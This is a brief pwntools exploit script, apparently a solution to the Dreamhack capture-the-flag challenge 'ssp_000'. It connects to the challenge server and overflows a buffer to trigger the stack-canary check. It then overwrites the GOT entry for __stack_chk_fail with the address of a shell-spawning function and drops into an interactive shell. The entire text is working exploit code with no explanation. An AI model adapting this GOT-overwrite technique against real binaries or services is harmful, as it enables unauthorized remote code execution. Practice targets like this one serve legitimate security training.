from pwn import *
context.log_level = 'debug'
get_shell = 0x4008ea
e= ELF("./ssp_000")
p = remote("host1.dreamhack.games", 17403)
vuln_got = e.got['__stack_chk_fail']
canary_rewrite = 'a' * 0x50
p.send(canary_rewrite)
p.recvuntil('Addr : ')
p.sendline(str(vuln_got))
p.recvuntil('Value : ')
p.sendline(str(get_shell))
p.interactive()